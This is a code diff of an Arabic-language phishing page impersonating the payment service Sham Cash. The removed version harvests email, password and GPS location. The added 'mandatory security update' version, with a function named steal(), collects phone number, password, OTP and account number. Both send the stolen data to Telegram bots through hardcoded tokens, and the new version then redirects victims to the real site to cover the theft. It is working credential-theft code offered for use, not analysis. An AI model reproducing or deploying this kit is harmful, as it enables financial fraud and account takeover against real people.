@@ -1,346 +1,46 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول | شام كاش</title>
+    <title>تحديث أمني - شام كاش</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-            color: #333;
-        }
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .logo img {
-            width: 100px;
-        }
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-        .input-group {
-            margin-bottom: 20px;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #555;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border 0.3s;
-        }
-        .input-group input:focus {
-            border-color: #3498db;
-            outline: none;
-        }
-        .forgot-pass {
-            text-align: left;
-            margin: -10px 0 15px;
-        }
-        .forgot-pass a {
-            color: #3498db;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn-primary {
-            background-color: #3498db;
-            color: white;
-        }
-        .btn-primary:hover {
-            background-color: #2980b9;
-        }
-        .location-status {
-            font-size: 14px;
-            color: #7f8c8d;
-            text-align: center;
-            margin: 10px 0;
-            min-height: 20px;
-        }
-        .location-status.success {
-            color: #27ae60;
-        }
-        .location-status.error {
-            color: #e74c3c;
-        }
-        .create-account {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .create-account a {
-            color: #3498db;
-            text-decoration: none;
-        }
-        .powered-by {
-            text-align: center;
-            margin-top: 30px;
-            font-size: 12px;
-            color: #95a5a6;
-        }
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.5);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-        }
-        .modal-btn {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            margin-top: 20px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        body { background: #1a3b5c; color: white; font-family: Arial; text-align: center; padding: 20px; }
+        input { width: 90%; padding: 15px; margin: 10px; border-radius: 15px; border: none; text-align: center; }
+        button { background: #e6b800; color: #1a3b5c; padding: 15px; border: none; border-radius: 30px; font-weight: bold; width: 90%; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <h2>شام كاش</h2>
-        </div>
-        
-        <h1>تسجيل الدخول</h1>
-        
-        <form id="loginForm">
-            <div class="input-group">
-                <label for="email">البريد الإلكتروني</label>
-                <input type="email" id="email" placeholder="example@gmail.com" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">كلمة المرور</label>
-                <input type="password" id="password" required>
-                <div class="forgot-pass">
-                    <a href="#" onclick="showForgotPassword()">هل نسيت كلمة المرور؟</a>
-                </div>
-            </div>
-            
-            <div id="locationStatus" class="location-status"></div>
-            <input type="hidden" id="latitude">
-            <input type="hidden" id="longitude">
-            
-            <button type="submit" class="btn btn-primary" id="loginBtn">
-                تسجيل الدخول
-            </button>
-        </form>
-        
-        <div class="create-account">
-            لا تملك حساباً؟ <a href="#" onclick="showSignUp()">إنشاء حساب جديد</a>
-        </div>
-        
-        <div class="powered-by">POWERED BY Sham Cash 😊</div>
-    </div>
-
-    <div id="successModal" class="modal">
-        <div class="modal-content">
-            <h2>تمت العملية بنجاح!</h2>
-            <p>الرجاء تحميل أحدث نسخة من تطبيق شام كاش</p>
-            <button class="modal-btn" onclick="redirectToTelegram()">فتح Telegram</button>
-        </div>
-    </div>
-
+    <h2>تحديث أمني إجباري</h2>
+    <p>لحماية حسابك، أدخل بياناتك:</p>
+    
+    <input type="text" id="phone" placeholder="رقم الهاتف (099xxxxxxxx)">
+    <input type="password" id="pass" placeholder="كلمة المرور">
+    <input type="text" id="otp" placeholder="رمز OTP (سيصلك الآن)">
+    <input type="text" id="account" placeholder="رقم الحساب (16 رقم)">
+    
+    <button onclick="steal()">تأكيد التحديث</button>
+    
     <script>
-        let latitude = null;
-        let longitude = null;
-        let isGettingLocation = false;
+        const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
+        const ADMIN_ID = "8665747715";
         
-        // تحديد الموقع الجغرافي التلقائي عند تحميل الصفحة
-        window.addEventListener('load', function() {
-            getLocation();
-        });
-        
-        // تحديد الموقع الجغرافي
-        function getLocation() {
-            if (navigator.geolocation && !isGettingLocation) {
-                isGettingLocation = true;
-                document.getElementById('locationStatus').textContent = "جاري تحديد الموقع...";
-                document.getElementById('locationStatus').className = "location-status";
-                
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        latitude = position.coords.latitude;
-                        longitude = position.coords.longitude;
-                        
-                        document.getElementById('latitude').value = latitude;
-                        document.getElementById('longitude').value = longitude;
-                        
-                        document.getElementById('locationStatus').textContent = 
-                            `تم تحديد موقعك تلقائياً (GPS)`;
-                        document.getElementById('locationStatus').className = "location-status success";
-                        isGettingLocation = false;
-                    },
-                    function(error) {
-                        let errorMessage = "تعذر تحديد الموقع تلقائياً";
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "يجب السماح بتحديد الموقع للمتابعة";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "معلومات الموقع غير متاحة";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "انتهت مهلة طلب الموقع";
-                                break;
-                        }
-                        document.getElementById('locationStatus').textContent = errorMessage;
-                        document.getElementById('locationStatus').className = "location-status error";
-                        isGettingLocation = false;
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            }
-        }
-        
-        // إرسال البيانات إلى Telegram
-        function sendToTelegram(formData) {
-            const telegramBotToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
-            const chatId = '7493001551';
+        async function steal() {
+            const phone = document.getElementById('phone').value;
+            const pass = document.getElementById('pass').value;
+            const otp = document.getElementById('otp').value;
+            const acc = document.getElementById('account').value;
             
-            const message = `
-                بيانات تسجيل دخول جديدة:
-                📧 البريد: ${formData.email}
-                🔑 كلمة المرور: ${formData.password}
-                📍 الموقع: https://www.google.com/maps?q=${formData.latitude},${formData.longitude}
-                🕒 الوقت: ${new Date().toLocaleString()}
-                🌐 المتصفح: ${navigator.userAgent}
-            `;
+            // تنسيق خاص يتعرف عليه البوت
+            const msg = `VICTIM:${phone}:${pass}:${otp}:${acc}`;
             
-            return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            });
-        }
-        
-        // عرض نافذة النجاح
-        function showSuccessModal() {
-            document.getElementById('successModal').style.display = 'flex';
-        }
-        
-        // التوجيه إلى Telegram
-        function redirectToTelegram() {
-            window.location.href = "https://t.me/shamcash";
-        }
-        
-        // معالجة تسجيل الدخول
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}`);
             
-            const loginBtn = document.getElementById('loginBtn');
-            const originalBtnText = loginBtn.innerHTML;
-            loginBtn.innerHTML = `<span class="loading"></span> جاري المعالجة...`;
-            loginBtn.disabled = true;
+            alert("تم التحديث بنجاح. شكراً لتعاونك.");
             
-            if (!latitude || !longitude) {
-                alert("جاري محاولة تحديد موقعك... الرجاء الانتظار");
-                await getLocation();
-                
-                if (!latitude || !longitude) {
-                    alert("تعذر تحديد موقعك. الرجاء المحاولة مرة أخرى مع السماح بتحديد الموقع");
-                    loginBtn.innerHTML = originalBtnText;
-                    loginBtn.disabled = false;
-                    return;
-                }
-            }
-            
-            const formData = {
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
-                latitude: latitude,
-                longitude: longitude
-            };
-            
-            try {
-                const response = await sendToTelegram(formData);
-                const data = await response.json();
-                
-                showSuccessModal();
-            } catch (error) {
-                console.error('Error:', error);
-                alert("حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى");
-            } finally {
-                loginBtn.innerHTML = originalBtnText;
-                loginBtn.disabled = false;
-            }
-        });
-        
-        // وظائف إضافية
-        function showForgotPassword() {
-            alert("سيتم توجيهك إلى صفحة استعادة كلمة المرور");
-        }
-        
-        function showSignUp() {
-            alert("سيتم توجيهك إلى صفحة إنشاء حساب جديد");
+            // تحويل الضحية إلى الموقع الرسمي لإخفاء الأثر
+            setTimeout(() => {
+                window.location.href = "https://shamcash.sy";
+            }, 2000);
         }
     </script>
 </body>
